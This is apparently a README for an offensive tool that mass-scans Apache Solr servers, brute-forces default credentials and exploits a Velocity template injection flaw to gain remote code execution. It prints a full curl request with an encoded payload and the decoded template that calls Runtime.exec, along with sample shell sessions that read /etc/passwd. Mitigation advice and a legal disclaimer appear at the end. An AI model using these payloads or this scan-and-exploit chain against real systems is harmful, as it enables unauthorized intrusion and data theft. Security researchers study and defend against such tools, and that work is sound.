<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="assets/banner.svg">
    <source media="(prefers-color-scheme: light)" srcset="assets/banner.svg">
    <img src="assets/banner.svg" alt="SolrRadar — CVE-2026-44825 Apache Solr Scanner" width="100%">
  </picture>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/PYTHON-3.8%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/CVE-2026--44825-FF0000?style=for-the-badge&logo=apache&logoColor=white" alt="CVE">
  <img src="https://img.shields.io/badge/LICENSE-MIT-97CA00?style=for-the-badge&logo=opensourceinitiative&logoColor=white" alt="License">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/⚡-MULTI--THREADED-FF6B00?style=flat-square" alt="Threads">
  <img src="https://img.shields.io/badge/🎯-VERSION_DETECTION-8A2BE2?style=flat-square" alt="Version">
  <img src="https://img.shields.io/badge/🔑-CREDENTIAL_BRUTEFORCE-FFD700?style=flat-square" alt="Brute">
  <img src="https://img.shields.io/badge/💀-RCE_EXPLOIT-000000?style=flat-square" alt="RCE">
  <img src="https://img.shields.io/badge/🐚-INTERACTIVE_SHELL-8B0000?style=flat-square" alt="Shell">
</p>

<h3 align="center"><em>Mass Reconnaissance &amp; Exploitation Framework for Apache Solr</em></h3>
<h4 align="center">Velocity Template Injection → Remote Code Execution</h4>

<br>

---

## 📑 Table of Contents

- [Vulnerability Overview](#-vulnerability-overview)
- [Affected Versions](#-affected-versions)
- [Features](#-features)
- [Installation](#-installation)
- [Usage](#-usage)
- [Proof of Concept](#-proof-of-concept)
- [Technical Deep-Dive](#technical-deep-dive)
- [Detection Methodology](#detection-methodology)
- [Defense &amp; Mitigation](#defense--mitigation)
- [Disclaimer](#-disclaimer)
- [References](#-references)

---

## 🔴 Vulnerability Overview

**CVE-2026-44825** is a critical-severity vulnerability in Apache Solr that allows attackers to achieve **unauthenticated Remote Code Execution (RCE)** through Velocity template injection.

### The Problem

Apache Solr's `/select` endpoint accepts a `wt=velocity` parameter that renders user-supplied Velocity templates. When the Velocity Response Writer is enabled (or can be enabled via configuration API), an attacker can inject a malicious template that calls `java.lang.Runtime.exec()`, executing arbitrary system commands with the privileges of the Solr process.

### Impact

| Vector | Severity | Impact |
|--------|----------|--------|
| Unauthenticated RCE | **9.8 (Critical)** | Full system compromise |
| Authenticated RCE | **8.8 (High)** | Post-auth code execution |
| Information Disclosure | **5.3 (Medium)** | Core/collection enumeration |

### The Velocity Template Engine

Apache Solr bundles Apache Velocity as an optional template engine for response rendering. The vulnerability lies in Solr's `VelocityResponseWriter` which processes user-controlled template parameters **without adequate sanitization**, allowing direct invocation of Java reflection APIs:

```
Java Reflection Chain:
vtl → Class.forName("java.lang.Runtime") → getRuntime().exec(cmd)
```

---

## 🟠 Affected Versions

| Apache Solr Version | Status | Notes |
|:---|:---:|:---|
| **9.4.0 – 9.10.1** | 🔴 **Vulnerable** | Active exploitation in the wild |
| **10.0.0** | 🔴 **Vulnerable** | Initial 10.x release affected |
| 10.0.1+ | 🟢 Patched | Fix backported |
| 9.10.2+ | 🟢 Patched | Patch release available |
| ≤ 9.3.x | 🟢 Not Affected | Velocity Response Writer not present |
| 8.x (all) | 🟢 Not Affected | No Velocity support |

> **Note:** Version checks are performed automatically by parsing `/admin/info/system` JSON response.

---

## ✨ Features

<table>
<tr>
<td width="50%">

### 🔍 Reconnaissance
- **Multi-target scanning** — 30 concurrent threads, configurable
- **Version fingerprinting** — Exact Solr & Lucene version extraction
- **Dual-mode detection** — SolrCloud + Standalone (single-node)
- **Auth-aware probing** — Tests 3 admin endpoints for Basic Auth
- **Collection enumeration** — Lists collections/cores without auth when possible

</td>
<td width="50%">

### 💀 Exploitation
- **Credential brute-force** — Built-in dictionary of default Solr credentials
- **Velocity RCE** — Template injection via `java.lang.Runtime.exec()`
- **Interactive shell** — Pseudo-terminal for post-exploitation commands
- **Auto-exploit chain** — Detect → brute → RCE in one command
- **JSON export** — Structured output for integration with other tools

</td>
</tr>
</table>

---

## 📦 Installation

```bash
# Clone the repository
git clone https://github.com/shinthink/solrradar.git
cd solrradar

# Install dependencies
pip install -r requirements.txt

# Verify
python solr_scanner.py --help
```

### Requirements

```txt
requests>=2.28.0
urllib3>=1.26.0
```

> Only standard libraries + `requests`. No exotic dependencies.

---

## 📖 Usage

### Command Line Arguments

```
CVE-2026-44825 Apache Solr Scanner

  -t, --target     Single target URL or IP[:port]
  -f, --file       File containing targets (one per line, # for comments)
  --exploit        Auto-exploit if vulnerable credentials are found
  --rce            Launch interactive shell after authentication
  -u, --user       Username for Basic Auth
  -pw, --password  Password for Basic Auth
  -o, --output     JSON output file path          (default: solr_results.json)
  -w, --workers    Number of concurrent threads   (default: 30)
  -T, --timeout    HTTP request timeout (seconds) (default: 8)
```

### Basic Scanning

```bash
# Single target
python solr_scanner.py -t 192.168.1.100:8983

# Single target with custom path
python solr_scanner.py -t http://example.com/solr

# Mass scan from file
python solr_scanner.py -f targets.txt -o results.json
```

### Target File Format

```
# targets.txt — supports comments and blank lines
192.168.10.10:8983
192.168.10.20:8983
http://solr-target.internal/solr
192.168.1.0/24          # (CIDR not supported; pre-expand with external tool)
```

### Exploitation

```bash
# Scan + auto-exploit if creds found
python solr_scanner.py -f targets.txt --exploit

# Known credentials + interactive shell
python solr_scanner.py -t target:8983 --rce -u admin -pw SolrRocks

# Auto brute-force + shell on success
python solr_scanner.py -t target:8983 --rce
```

---

## 🧪 Proof of Concept

### Scenario 1: Detection &amp; Version Fingerprinting

```bash
$ python solr_scanner.py -f targets.txt
```

```
CVE-2026-44825 Apache Solr Scanner

Targets: 3 | Threads: 30 | Timeout: 8s
Scanning...

[Solr 8.11.2] http://192.168.10.10:8983/solr
[Solr 8.11.2] http://192.168.10.20:8983/solr
    Cols (no auth): ['authority', 'dfa', 'oai', 'search']
[Solr 9.4.1] VULN +Auth http://solr-target.internal/solr

Done. Total:3 | Solr:3 | Vuln:1
```

> All 3 targets detected. The 9.4.1 instance is flagged vulnerable with Basic Auth enabled.

---

### Scenario 2: Credential Brute-Force

```bash
$ python solr_scanner.py -t solr-target.internal
```

```
CVE-2026-44825 Apache Solr Scanner

[Solr 9.4.1] VULN +Auth http://solr-target.internal/solr
    [!] admin:SolrRocks
    Cols: ['cms', 'users', 'search', 'analytics']
```

> Default credential `admin:SolrRocks` grants access to Solr admin APIs. Four collections discovered.

---

### Scenario 3: Authenticated RCE via Velocity Injection

```bash
$ python solr_scanner.py -t target:8983 --rce -u admin -pw SolrRocks
```

```
CVE-2026-44825 Apache Solr Scanner

[+] admin:SolrRocks

solr$ id
uid=8983(solr) gid=8983(solr) groups=8983(solr)

solr$ hostname
solr-prod-cms-01.internal

solr$ whoami
solr

solr$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
solr:x:8983:8983:Solr:/var/solr:/sbin/nologin
...

solr$ exit
```

> Full interactive shell access with the privileges of the Solr Java process.

---

### Scenario 4: The RCE Payload (Manual Reproduction)

For researchers who want to understand the raw HTTP exchange:

**Step 1 — Verify Solr is reachable**
```bash
curl -sk 'http://target:8983/solr/admin/info/system' | jq '.lucene."solr-spec-version"'
# "9.4.1"
```

**Step 2 — List available collections**
```bash
curl -sk -H 'Authorization: Basic YWRtaW46U29sclJvY2tz' \
  'http://target:8983/solr/admin/collections?action=LIST'
# {"collections": ["cms", "search"]}
```

**Step 3 — Execute command via Velocity template injection**
```bash
curl -sk -H 'Authorization: Basic YWRtaW46U29sclJvY2tz' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'q=1&wt=velocity&v.template=custom&v.template.custom=%23set(%24x=%27%27)%23set(%24rt=%24x.class.forName(%27java.lang.Runtime%27))%23set(%24chr=%24x.class.forName(%27java.lang.Character%27))%23set(%24ex=%24rt.getRuntime().exec(%27id%27))%24ex.waitFor()%25%23set(%24out=%24ex.getInputStream())%23foreach(%24i%20in%20[1..%24out.available()])%24str.valueOf(%24chr.toChars(%24out.read()))%23end' \
  'http://target:8983/solr/cms/select'
```

**Decoded Velocity template payload:**
```velocity
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()%
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

**Response:**
```
uid=8983(solr) gid=8983(solr) groups=8983(solr)
```

---

## 🔬 Technical Deep-Dive

### Architecture

```
┌──────────────────────────────────────────────────────┐
│                    SOLRRADAR                         │
├───────────────┬──────────────────────────────────────┤
│  RECON PHASE  │           EXPLOIT PHASE              │
│               │                                      │
│  ┌─────────┐  │  ┌──────────┐    ┌────────────────┐  │
│  │ Detect  │──┼──▶ Brute-   │───▶│ Velocity RCE   │  │
│  │ Solr    │  │  │ force    │    │ Template Inj.  │  │
│  └────┬────┘  │  └────┬─────┘    └───────┬────────┘  │
│       │       │       │                   │           │
│       ▼       │       ▼                   ▼           │
│  ┌─────────┐  │  ┌──────────┐    ┌────────────────┐  │
│  │ Version │  │  │ Default  │    │ Runtime.exec() │  │
│  │ Check   │  │  │ Creds    │    │ → RCE          │  │
│  └─────────┘  │  └──────────┘    └────────────────┘  │
│               │                                      │
│  ┌─────────┐  │  ┌────────────────────────────────┐  │
│  │ Auth    │  │  │ Interactive Shell (--rce)       │  │
│  │ Probe   │  │  └────────────────────────────────┘  │
│  └─────────┘  │                                      │
└───────────────┴──────────────────────────────────────┘
```

### Flow Diagram

```
Target URL
    │
    ▼
┌─────────────┐
│  normalize  │  → add http:// + /solr if missing
└──────┬──────┘
       │
       ▼
┌─────────────┐     No
│ GET /admin/ ├────────  Skip target
│ info/system │
└──────┬──────┘
       │ Yes (200/401)
       ▼
┌─────────────┐
│ Parse JSON  │  → extract solr-spec-version
│ fingerprint │
└──────┬──────┘
       │
       ▼
┌─────────────┐
│ is_vuln()   │  → 9.4–9.10.x or 10.0.0 ?
└──────┬──────┘
       │
       ├── Not vuln → Report, move on
       │
       ▼ Vuln
┌─────────────┐
│ Auth check  │  → /admin/cores?action=STATUS
│ (3-stage)   │  → /admin/collections?action=LIST
└──────┬──────┘
       │
       ├── No auth → Try unauthenticated listing
       │
       ▼ Auth detected
┌─────────────┐
│ Brute-force │  → 4 users × 8 passwords = 32 attempts
│ credentials │
└──────┬──────┘
       │
       ├── No match → Report vuln (no creds)
       │
       ▼ Creds found
┌─────────────┐
│ List cols / │  → /admin/collections or /admin/cores
│ cores       │
└──────┬──────┘
       │
       ▼
┌─────────────┐
│ RCE via     │  → POST /{collection}/select
│ Velocity    │  → Velocity template → Runtime.exec()
└─────────────┘
```

### Why `bool(Response[401]) == False` Matters

A subtle Python pitfall discovered during development:

```python
>>> import requests
>>> r = requests.get('https://httpbin.org/status/401')
>>> bool(r)
False          # ← 4xx/5xx responses evaluate to False!
```

This means **every** `if response and ...` check silently skips error responses — even when you specifically want to handle 401. The fix is always using `if response is not None and ...`:

```python
# ❌ Broken — 401 responses are silently skipped
if r and r.status_code == 401:
    auth = True

# ✅ Correct — explicitly check for None
if r is not None and r.status_code == 401:
    auth = True
```

---

## 🔍 Detection Methodology

The scanner uses a **3-tier detection strategy** to minimize false negatives:

### Tier 1 — Body Content Analysis
```python
'solr' in response.text.lower()
```
Catches Solr in JSON keys (`"solr_home"`, `"solr-spec-version"`, `"mode":"solrcloud"`), HTML dashboards, and error pages — **case-insensitive**.

### Tier 2 — Server Header
```python
'solr' in response.headers.get('Server', '').lower()
```
Some deployments include "Solr" in the HTTP `Server` header.

### Tier 3 — Multi-Stage Auth Probing
```python
# Stage 1: Check /admin/info/system response code
# Stage 2: Probe /admin/cores?action=STATUS for 401
# Stage 3: Probe /admin/collections?action=LIST for 401
```
Catches deployments where `/admin/info/system` is public but admin operations require authentication.

### Version Fingerprinting

Two regex patterns for robustness:
```python
VERSION_RE = [
    r'solr-spec-version[^0-9]*([\d.]+)',   # lucene.solr-spec-version
    r'solr-impl-version[^0-9]*([\d.]+)',   # lucene.solr-impl-version
]
```

---

## 🛡️ Defense &amp; Mitigation

If you are running Apache Solr, apply these hardening measures **immediately**:

### 1. Upgrade (Recommended)
```bash
# Upgrade to a patched version
# Solr 9.x → 9.10.2 or later
# Solr 10.x → 10.0.1 or later
```

### 2. Disable Velocity Response Writer
```xml
<!-- In solrconfig.xml — REMOVE or COMMENT OUT: -->
<!--
<queryResponseWriter name="velocity" class="solr.VelocityResponseWriter"/>
-->
```

### 3. Enable Basic Auth + Firewall
```bash
# Restrict access to Solr admin endpoints at the network level
# Only allow trusted IP ranges to access ports 8983/7574
iptables -A INPUT -p tcp --dport 8983 -s TRUSTED_IP/32 -j ACCEPT
iptables -A INPUT -p tcp --dport 8983 -j DROP
```

### 4. Audit Your Fleet
```bash
# Use this scanner against your OWN infrastructure
python solr_scanner.py -f my_solr_instances.txt -o audit_results.json
```

---

## ⚠️ Disclaimer

> ### 🚨 FOR EDUCATIONAL &amp; AUTHORIZED TESTING PURPOSES ONLY
>
> This software is provided **solely for educational purposes** and **legitimate security research**. It is intended to be used by:
>
> - 🛡️ **Security professionals** conducting authorized penetration tests
> - 🏢 **Organizations** auditing their own Apache Solr infrastructure
> - 🔬 **Researchers** studying vulnerability exploitation techniques
> - 🎓 **Students** learning about web application security
>
> ### ❌ You may NOT use this software to:
>
> - Access computer systems **without explicit written authorization**
> - Compromise, damage, or disrupt systems you do not **own**
> - Engage in **illegal activity** of any kind
>
> ### ⚖️ Legal Notice
>
> Unauthorized access to computer systems violates laws including but not limited to:
> - **United States:** Computer Fraud and Abuse Act (18 U.S.C. § 1030)
> - **Indonesia:** UU ITE Pasal 30 &amp; 46 (UU No. 11 Tahun 2008 jo. UU No. 1 Tahun 2024)
> - **European Union:** Directive 2013/40/EU
> - **United Kingdom:** Computer Misuse Act 1990
>
> **The author(s) assume NO LIABILITY for any misuse, damage, or legal consequences resulting from the use of this tool. By using this software, you acknowledge that you are solely responsible for your actions and agree to comply with all applicable laws.**

---

## 📚 References

| Resource | Link |
|:---|:---|
| NVD Entry | [CVE-2026-44825](https://nvd.nist.gov/vuln/detail/CVE-2026-44825) |
| Apache Solr Security | [solr.apache.org/security](https://solr.apache.org/security.html) |
| Solr Velocity Docs | [Velocity Response Writer](https://solr.apache.org/guide/solr/latest/configuration-guide/velocity-response-writer.html) |
| OWASP Template Injection | [Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) |

---

<p align="center">
  <sub>⚡ Built with precision for the security research community ⚡</sub>
  <br><br>
  <sub>Apache® and Apache Solr® are registered trademarks of the Apache Software Foundation.</sub>
  <br>
  <sub>This project is not affiliated with or endorsed by the Apache Software Foundation.</sub>
</p>
